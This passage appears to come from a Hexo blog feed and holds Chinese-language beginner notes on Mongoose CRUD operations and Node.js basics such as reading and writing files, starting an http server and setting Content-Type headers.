class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"><span class="comment">//创建数据库</span></span><br><span class="line">mongoose.connect(<span class="string">'mongodb://localhost:27017/test'</span>, &#123;<span class="attr">useNewUrlParser</span>: <span class="literal">true</span>, <span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="comment">//定义集合</span></span><br><span class="line"><span class="keyword">const</span> Cat = mongoose.model(<span class="string">'Cat'</span>, &#123; <span class="attr">name</span>: <span class="built_in">String</span> &#125;);</span><br><span class="line"><span class="comment">//添加数据</span></span><br><span class="line"><span class="keyword">const</span> kitty = <span class="keyword">new</span> Cat(&#123; <span class="attr">name</span>: <span class="string">'Zildjian'</span> &#125;);</span><br><span class="line"><span class="comment">//保存成功提示（ES6）</span></span><br><span class="line">kitty.save().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'meow'</span>));</span><br></pre></td></tr></table></figure><h2 id="设计文档结构（表结构）"><a href="#设计文档结构（表结构）" class="headerlink" title="设计文档结构（表结构）"></a>设计文档结构（表结构）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引用架构对象</span></span><br><span class="line"><span class="keyword">var</span> Schema = mongoose.Schema</span><br><span class="line"><span class="comment">//设计集合结构以及约束</span></span><br><span class="line"><span class="keyword">var</span> catSchema = <span class="keyword">new</span> Schema(&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">        type: <span class="built_in">String</span>,</span><br><span class="line">        required: <span class="literal">true</span> <span class="comment">//约束:必须给值</span></span><br><span class="line">    &#125;,</span><br><span class="line">    age: &#123;</span><br><span class="line">        type: <span class="built_in">Number</span>,</span><br><span class="line">        required: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//创建集合并引用集合结构以及添加约束</span></span><br><span class="line"><span class="keyword">const</span> Cat = mongoose.model(<span class="string">'Cat'</span>, catSchema);</span><br></pre></td></tr></table></figure><h2 id="数据添加（增）"><a href="#数据添加（增）" class="headerlink" title="数据添加（增）"></a>数据添加（增）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加数据</span></span><br><span class="line"><span class="keyword">const</span> kitty0 = <span class="keyword">new</span> Cat(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span>, <span class="attr">age</span>: <span class="number">6</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> kitty1 = <span class="keyword">new</span> Cat(&#123; <span class="attr">name</span>: <span class="string">'jian'</span>, <span class="attr">age</span>: <span class="number">7</span> &#125;);</span><br><span class="line"><span class="comment">//保存成功提示（ES6）</span></span><br><span class="line">kitty0.save().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'meow'</span>));</span><br><span class="line">kitty1.save().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'meow'</span>));</span><br></pre></td></tr></table></figure><h2 id="数据删除（删）"><a href="#数据删除（删）" class="headerlink" title="数据删除（删）"></a>数据删除（删）</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Cat.deleteOne(&#123;<span class="attr">name</span>:<span class="string">'Zild'</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err,ret</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'删除失败'</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(ret)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">Cat.deleteMany(&#123;<span class="attr">name</span>:<span class="string">'Zild'</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,ret</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'删除失败'</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>()&#123;</span><br><span class="line"><span class="built_in">console</span>.log(ret)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//remove方法官方不推荐使用，这里不考虑</span></span><br></pre></td></tr></table></figure><h2 id="数据更改（改）"><a href="#数据更改（改）" class="headerlink" title="数据更改（改）"></a>数据更改（改）</h2><ul><li>根据且只能根据id</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Cat.where(&#123; <span class="attr">_id</span>: <span class="string">"5ec9c7012909a22e7c89b5ac"</span> &#125;).update(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span>, <span class="attr">age</span>: <span class="number">8</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'更新失败'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">Cat.findByIdAndUpdate(&#123; <span class="attr">_id</span>: <span class="string">"5ec9c7012909a22e7c89b5ac"</span> &#125;, &#123; <span class="attr">name</span>: <span class="string">'Zild'</span>, <span class="attr">age</span>: <span class="number">9</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret) <span class="comment">//返回修改前的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>根据文档（记录）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.findOneAndUpdate(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span> &#125;, &#123; <span class="attr">name</span>: <span class="string">'Zild1'</span>, <span class="attr">age</span>: <span class="number">9</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret) <span class="comment">//返回修改前的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="数据查询（查）"><a href="#数据查询（查）" class="headerlink" title="数据查询（查）"></a>数据查询（查）</h2><p>查询全部</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.find(<span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>查询指定属性的全部对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.find(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>查询指定属性的单个对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cat.findOne(&#123; <span class="attr">name</span>: <span class="string">'Zild'</span> &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, ret</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"查询失败"</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(ret)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.JS笔记</title>
      <link href="/2020/07/10/Node.JS/"/>
      <url>/2020/07/10/Node.JS/</url>
      
        <content type="html"><![CDATA[<blockquote><p>根据学习<a href="https://www.bilibili.com/video/BV1Ns411N7HU" target="_blank" rel="noopener">B站周老师</a>记录的笔记，并且也做了对应的<a href="https://www.processon.com/view/link/604b5c207d9c08389fdda72a" target="_blank" rel="noopener">思维导图</a>，搭配食用更佳</p></blockquote><h1 id="Node-JS简介"><a href="#Node-JS简介" class="headerlink" title="Node.JS简介"></a>Node.JS简介</h1><h2 id="何为Node-JS"><a href="#何为Node-JS" class="headerlink" title="何为Node.JS"></a>何为Node.JS</h2><ul><li>Node.JS为JavaScript运行时</li><li>Node.JS是JavaScript的运行平台</li><li>它既不是一门语言，也不是框架，它是一个平台</li></ul><h2 id="Node-JS中的JS"><a href="#Node-JS中的JS" class="headerlink" title="Node.JS中的JS"></a>Node.JS中的JS</h2><ul><li>Node.JS没有dom和bom</li><li>EcmaScript</li><li>Node.JS在JavaScript执行环境中为JavaScript提供一些服务器级别的API<ul><li>文件读写</li><li>网络服务构建</li><li>网络通信</li><li>http服务器</li><li>……</li></ul></li></ul><h2 id="Node-JS构建于Chrome的V8引擎"><a href="#Node-JS构建于Chrome的V8引擎" class="headerlink" title="Node.JS构建于Chrome的V8引擎"></a>Node.JS构建于Chrome的V8引擎</h2><ul><li>代码只是具有特定格式的字符串</li><li>引擎可以认识它，帮你解析和执行</li><li>Google Chrome的V8引擎是目前公认的解析执行JavaScript代码最快的</li><li>Node.js的作者把Google Chrome中的V8引擎移植出来，开发了一个独立的JavaScript运行时环境</li></ul><h2 id="Node-JS的特性"><a href="#Node-JS的特性" class="headerlink" title="Node.JS的特性"></a>Node.JS的特性</h2><ul><li>envent-driven 事件驱动</li><li>non-blocking I/O mode 非阻塞I/O模型（异步）</li><li>ightweight and efficent. 轻量和高效</li></ul><h2 id="Node-JS的作用"><a href="#Node-JS的作用" class="headerlink" title="Node.JS的作用"></a>Node.JS的作用</h2><ul><li>web服务器后台</li><li>命令行工具<ul><li>npm(node)</li><li>git(c语言)</li><li>hexo（node）</li><li>…</li></ul></li></ul><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>npm为世界上最大的开源生态系统</p><h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><ul><li>下载：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></li><li>安装node环境</li><li>检测node环境<ul><li>开启命令行提示符（cmd）</li><li>输入<code>node --vesion</code></li><li>或<code>node -v</code></li><li>正常状态下返回版本号</li></ul></li></ul><h2 id="解析执行JavaScript"><a href="#解析执行JavaScript" class="headerlink" title="解析执行JavaScript"></a>解析执行JavaScript</h2><ul><li>创建和编写JavaScript脚本文件</li><li>打开终端（cmd），定位脚本文件所在位置（也就是执行脚本所在文件目录）</li><li>输入<code>node 文件名</code>进行执行</li></ul><p><strong>注意：</strong>文件名不要使用Node.JS命名，并且最好不用中文</p><h1 id="fs"><a href="#fs" class="headerlink" title="fs"></a>fs</h1><p>文件操作模块</p><ul><li>浏览器中的 JavaScript 没有文件操作能力</li><li>Node中的 JavaScript 具有文件操作能力</li><li>fs 是 file-system 的简写，为文件系统的意思</li><li>在 Node 中如果想要进行文件操作，就必须引入 fs 这个核心模块</li><li>在 fs 这个核心模块中，就提供了所有文件操作相关的 API，<ul><li>fs.readFile 用来读取文件</li><li>fs.writeFile用来写入文件</li></ul></li><li>文件中存储的都是二进制数据，用<code>toString()</code>方法转换为字符串</li></ul><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><ol><li><p>使用<code>require</code>方法加载<code>fs</code>核心模块</p></li><li><p>使用<code>readFile</code>函数读取文件</p><ul><li><p>两个参数，第一个为文件路径，第二个为回调函数</p></li><li><p>回调函数中有两个参数</p></li><li><p>第一个参数为返回错误，第二个为数据</p></li><li><p>成功：error: null; data: 返回数据</p></li><li><p>失败: error: 错误对象; data: undefined</p></li><li><p>可以利用<code>error</code>进行语句判断</p></li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用node中的fs模块读取文件（使用require语句）</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">//readFIle方法读取文件内容</span></span><br><span class="line">a.readFile(<span class="string">'测试.txt'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error,data</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(error);</span><br><span class="line"><span class="keyword">if</span>(error === <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(data.toString());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"文件错误,读取文件失败"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><ol><li>使用<code>require</code>方法加载<code>fs</code>核心模块</li><li>使用<code>writeFile</code>函数读取文件<ul><li>包含三个参数</li><li>第一个参数为文件路径及名称</li><li>第二个参数为写入文本内容</li><li>第三个参数为回调函数</li><li>回调函数中的<code>error</code>参数<br>文件写入成功 :<code>error</code> 是 <code>null</code><br>文件写入失败: <code>error</code> 就是错误对象</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">a.writeFile(<span class="string">'你是最棒的.md'</span>,<span class="string">'你是最棒的'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(error);</span><br><span class="line"><span class="keyword">if</span> (error === <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"写入成功"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"写入失败"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><h2 id="IP地址和端口号"><a href="#IP地址和端口号" class="headerlink" title="IP地址和端口号"></a>IP地址和端口号</h2><ul><li>IP地址用来定位计算机</li><li>端口号用来定位具体应用程序</li><li>所有需要联网的应用程序都需要占用一个端口号</li><li>计算机默认端口号尽量不要访问<ul><li>80</li><li>…</li></ul></li></ul><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><ul><li>提供服务：为数据服务</li><li>发请求</li><li>接收请求</li><li>处理请求</li><li>反馈（发送响应）</li><li>当客户端请求过来，就会自动触发服务器的request请求事件，然后执行第二个参数：回调处理函数</li></ul><h2 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h2><ol><li>加载http模块</li><li>创建web服务对象</li><li>监听（注册）request事件</li><li>绑定端口号，启动服务</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载http模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建web服务对象</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer()</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册request事件</span></span><br><span class="line">server.on(<span class="string">'request'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'收到客户端请求'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定端口号，启动服务</span></span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'服务器启动成功了，可以通过 http://127.0.0.1:3000/ 来进行访问'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="request请求事件处理函数"><a href="#request请求事件处理函数" class="headerlink" title="request请求事件处理函数"></a><code>request</code>请求事件处理函数</h2><ul><li><code>request</code> 请求事件处理函数，需要接收两个参数：<code>request</code>和<code>response</code></li><li><code>request</code> 请求对象：请求对象可以用来获取客户端的一些请求信息，例如请求路径</li><li><code>reponse</code>响应对象：响应对象可以用来给客户端发送响应消息</li><li>响应内容只能是二进制数据或者字符串</li><li>转出数据内容为其他数据类型时需转化格式</li><li>一个请求对应一个响应，已经结束响应则无法重复发送响应</li><li>无请求就无响应</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载http模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="comment">//创建web服务</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer()</span><br><span class="line"><span class="comment">//监听request事件，设置请求处理函数，函数参数调用request和response</span></span><br><span class="line">server.on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">request,response</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'请求路径为'</span> + request.url) <span class="comment">//request.url为请求路径</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'请求我的客户端的地址是：'</span>, request.socket.remoteAddress,</span><br><span class="line">                request.socket.remotePort)</span><br><span class="line"><span class="comment">//响应条件判断，判断请求路径</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//json测试</span></span><br><span class="line"><span class="keyword">var</span> phone = [</span><br><span class="line">&#123;</span><br><span class="line">name: <span class="string">'apache'</span>,</span><br><span class="line">price: <span class="number">80000</span>,</span><br><span class="line">lcd: <span class="string">'a'</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">name: <span class="string">'asdfg'</span>,</span><br><span class="line">price: <span class="number">5000</span>,</span><br><span class="line">lcd: <span class="string">'d'</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">name: <span class="string">'hello'</span>,</span><br><span class="line">price: <span class="number">25000</span>,</span><br><span class="line">lcd: <span class="string">'c'</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (request.url) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">response.write(<span class="string">'你好啊'</span>)</span><br><span class="line">response.end()</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/a'</span>:</span><br><span class="line">response.write(<span class="string">'hello'</span>)</span><br><span class="line">response.end()</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/b'</span>:</span><br><span class="line">response.end(<span class="string">'leihoua'</span>)<span class="comment">//可以直接使用.end()函数</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/c'</span>:</span><br><span class="line">response.end(<span class="built_in">JSON</span>.stringify(phone))<span class="comment">//转化为字符串格式</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">response.write(<span class="string">'当前路径未存在'</span>)</span><br><span class="line">response.end()</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//绑定端口号，启动服务</span></span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'服务器启动成功了，可以通过 http://127.0.0.1:3000/ 来进行访问'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Content-type"><a href="#Content-type" class="headerlink" title="Content-type"></a>Content-type</h2><ul><li>服务器默认发送的数据为utf8编码内容</li><li>浏览器在不知道浏览器响应内容编码的情况下，会按当前操作系统默认编码解析</li><li>中文操作系统默认编码为gbk</li><li>在 http 协议中，Content-Type 就是用来告知对方我给你发送的数据内容是什么类型</li><li>不同的资源对应的 Content-Type 是不一样</li><li>Content-Type工具：<a href="http://tool.oschina.net/commons" target="_blank" rel="noopener">http://tool.oschina.net/commons</a></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载http模块</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="comment">//创建web服务对象</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer()</span><br><span class="line"><span class="comment">//注册request监听事件</span></span><br><span class="line">server.on(<span class="string">'request'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req,res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(req.url === <span class="string">'/index'</span>) &#123;</span><br><span class="line">res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain; charset=utf-8'</span>)</span><br><span class="line">res.end(<span class="string">'hello,你好鸭'</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.url === <span class="string">'/html'</span>) &#123;</span><br><span class="line">res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/html; charset=utf-8'</span>)</span><br><span class="line">res.end(<span class="string">'&lt;p&gt;来呀来呀，快来&lt;a href="#"&gt;点我&lt;/a&gt;鸭&lt;/p&gt;'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// text/plain 就是普通文本</span></span><br><span class="line"><span class="comment">// 如果你发送的是 html 格式的字符串，则也要告诉浏览器我给你发送是 text/html 格式的内容</span></span><br><span class="line">&#125;) </span><br><span class="line"><span class="comment">//绑定端口号，启动服务</span></span><br><span class="line">server.listen(<span class="string">'3000'</span>,<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'server begin...'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="返回文件（http-fs）"><a href="#返回文件（http-fs）" class="headerlink" title="返回文件（http-fs）"></a>返回文件（http-fs）</h2><ul><li><p>发送的并不是文件，本质上来讲发送是文件的内容（一堆字符串）</p></li><li><p>当浏览器收到服务器响应内容之后，就会根据你的 Content-Type 进行对应的解析处理</p></li><li><p>结合 fs 发送文件中的数据</p></li><li><p>字符数据需指定编码</p></li><li><p>图片不需要指定编码</p></li></ul><h3 id="根据url返回内容"><a href="#根据url返回内容" class="headerlink" title="根据url返回内容"></a>根据url返回内容</h3><ol><li><p>加载指定模块</p></li><li><p>创建服务对象</p></li><li><p>监听request事件</p><ol><li>判断请求的url</li><li>为对应的url返回文件<ol><li>读取文件内容</li><li>响应输出文件内容（注意转换格式与编码）</li></ol></li></ol></li><li><p>绑定端口号，启动服务</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加载指定模块</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="comment">//创建服务对象</span></span><br><span class="line"><span class="keyword">var</span> server = http.createServer()</span><br><span 